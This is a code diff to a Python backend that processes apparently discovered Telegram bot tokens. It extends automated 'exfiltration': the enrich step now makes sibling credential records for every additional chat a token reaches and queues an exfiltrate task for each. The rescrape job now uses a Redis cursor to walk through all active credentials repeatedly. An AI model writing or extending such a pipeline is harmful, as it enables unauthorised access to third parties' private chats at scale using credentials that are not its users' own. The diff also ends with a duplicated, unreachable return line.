@@ -286,7 +286,8 @@ async def _enrich_logic(cred_id: str):
     except Exception as e:
         logger.warning(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")
 
-    # Fetch current meta and merge — prevents overwriting ingestion context (domain, source, valid flags)
+    # Always re-fetch meta immediately before writing to minimise the race window
+    # (another worker may have enriched or set topic_id between our earlier fetch and now)
     cur = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
     meta_payload = dict((cur.data or {}).get("meta") or {})
     meta_payload.update({
@@ -308,24 +309,59 @@ async def _enrich_logic(cred_id: str):
     logger.info(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
     await broadcaster.send_log(f"🚀 Triggering background exfiltration task.")
     exfiltrate_chat.delay(cred_id)
-    
+
     msg = f"Enriched {cred_id} with chat {first_chat['id']}."
 
-    # Handle multiple chats
+    # --- Multi-chat: create sibling credential records for every additional chat ---
     if len(chats) > 1:
+        import hashlib as _hashlib
+        cloned = 0
         for extra_chat in chats[1:]:
-             # WORKAROUND for this MVP:
-            # We will only support 1 chat (the most recent/first one) per credential.
-            pass
-            
-        if len(chats) > 1:
-            all_chat_ids = [c["id"] for c in chats]
-            # Merge into the same meta_payload already fetched above — preserve all existing fields
-            meta_payload["all_chats"] = all_chat_ids
-            await async_execute(db.table("discovered_credentials").update({
-                "meta": meta_payload,
-            }).eq("id", cred_id))
-            msg += f" (Found {len(chats)} total chats, tracking primary only)"
+            extra_chat_id = extra_chat["id"]
+            # Synthetic hash: unique per (token, chat) pair so the UNIQUE constraint holds
+            extra_hash = _hashlib.sha256(
+                f"{bot_token}|chat:{extra_chat_id}".encode()
+            ).hexdigest()
+
+            try:
+                existing = await async_execute(
+                    db.table("discovered_credentials").select("id").eq("token_hash", extra_hash)
+                )
+                if existing.data:
+                    continue  # already exists from a previous enrich run
+
+                sibling_data = {
+                    "bot_token": security.encrypt(bot_token),
+                    "token_hash": extra_hash,
+                    "chat_id": extra_chat_id,
+                    "chat_name": extra_chat.get("name"),
+                    "chat_type": extra_chat.get("type"),
+                    "bot_id": str(bot_id),
+                    "bot_username": bot_username,
+                    "source": "multi_chat",
+                    "status": "active",
+                    "meta": {
+                        "bot_username": bot_username,
+                        "bot_id": bot_id,
+                        "topic_id": topic_id,  # share same monitor topic thread
+                        "parent_credential_id": cred_id,
+                        "enriched": True,
+                    },
+                }
+                res = await async_execute(db.table("discovered_credentials").insert(sibling_data))
+                if res.data:
+                    sibling_id = res.data[0]["id"]
+                    exfiltrate_chat.delay(sibling_id)
+                    cloned += 1
+                    logger.info(
+                        f"    ➕ [Enrich] Created sibling credential {sibling_id} for chat {extra_chat_id}"
+                    )
+            except Exception as e:
+                logger.error(f"    ❌ [Enrich] Failed to clone for chat {extra_chat_id}: {e}")
+
+        if cloned:
+            msg += f" (+{cloned} sibling chats queued)"
+            await broadcaster.send_log(f"➕ Queued {cloned} additional chat(s) for exfiltration.")
 
     return msg
 
@@ -596,48 +632,66 @@ def rescrape_active():
 
 
 async def _rescrape_active_logic():
-    """Query active credentials with a chat_id and trigger exfiltration in bounded batches."""
+    """
+    Cursor-based rescrape: advances through ALL active credentials across successive runs.
+    Each run processes one batch starting from where the previous run left off,
+    ensuring every credential is eventually rescraped regardless of table size.
+    """
     import os
     from app.core.metrics import metrics
     metrics.inc("rescrape.started")
 
-    # Cap at RESCRAPE_BATCH_SIZE (default 50) to avoid flooding the scrape queue.
-    # With concurrency=2 and ~20s per exfil, 50 tasks ≈ 8 min to drain.
     BATCH_SIZE = int(os.getenv("RESCRAPE_BATCH_SIZE", 50))
+    CURSOR_KEY = "rescrape:cursor:last_id"
 
     broadcaster = get_broadcaster()
-    await broadcaster.send_log("🔄 **Re-scrape**: Starting periodic scrape of active credentials...")
+
+    # Read cursor from Redis — empty string means start of table
+    last_id = redis_client.get(CURSOR_KEY) or ""
 
     try:
-        response = await async_execute(db.table("discovered_credentials")\
-            .select("id")\
-            .eq("status", "active")\
-            .not_.is_("chat_id", "null")\
-            .limit(BATCH_SIZE)\
-            )
+        query = (
+            db.table("discovered_credentials")
+            .select("id")
+            .eq("status", "active")
+            .not_.is_("chat_id", "null")
+            .order("id", desc=False)
+            .limit(BATCH_SIZE)
+        )
+        if last_id:
+            query = query.gt("id", last_id)
 
+        response = await async_execute(query)
         credentials = response.data or []
 
         if not credentials:
-            await broadcaster.send_log("ℹ️ **Re-scrape**: No active credentials to scrape.")
-            return "No active credentials found."
+            # End of table — reset cursor so the next run starts over
+            redis_client.delete(CURSOR_KEY)
+            await broadcaster.send_log("🔄 **Re-scrape**: Full table scanned — cursor reset to start.")
+            return "Rescrape cursor reset (full table covered)."
 
-        await broadcaster.send_log(f"📋 **Re-scrape**: Queuing {len(credentials)} credentials (batch cap: {BATCH_SIZE})...")
+        # Advance cursor to last ID in this batch
+        new_cursor = credentials[-1]["id"]
+        redis_client.set(CURSOR_KEY, new_cursor)
+
+        await broadcaster.send_log(
+            f"🔄 **Re-scrape**: Queuing {len(credentials)} credentials (cursor: ...{new_cursor[-8:]})..."
+        )
 
         queued = 0
         for cred in credentials:
-            cred_id = cred["id"]
             try:
-                exfiltrate_chat.delay(cred_id)
+                exfiltrate_chat.delay(cred["id"])
                 queued += 1
             except Exception as e:
-                logger.error(f"Failed to queue exfiltration for {cred_id}: {e}")
-        
-        msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials for exfiltration."
+                logger.error(f"Failed to queue exfiltration for {cred['id']}: {e}")
+
+        msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials."
         await broadcaster.send_log(msg)
         return msg
-        
+
     except Exception as e:
         error_msg = f"❌ **Re-scrape** failed: {e}"
         await broadcaster.send_log(error_msg)
+        return error_msg
         return error_msg
